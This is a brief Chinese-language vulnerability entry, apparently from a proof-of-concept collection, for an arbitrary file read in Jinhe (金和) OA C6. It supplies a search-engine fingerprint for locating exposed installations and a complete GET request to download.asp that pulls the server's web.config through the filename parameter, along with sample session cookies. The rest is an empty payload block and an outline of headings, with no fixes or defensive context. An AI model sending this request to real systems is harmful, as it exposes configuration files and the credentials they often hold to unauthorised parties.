# 金和OAC6testbill存在任意文件读取漏洞

- **系统**：金和OA　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="金和 OA"`
- **请求**：`GET /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ASP.NET_SessionId=a0a3lu45abjwtlzkax3edq55; myie=false; ASPSESSIONIDCQSCTTTC=NDH…`

**请求体 / payload**
```

```

**其他**
- 金和OA C6 testbill存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金和OA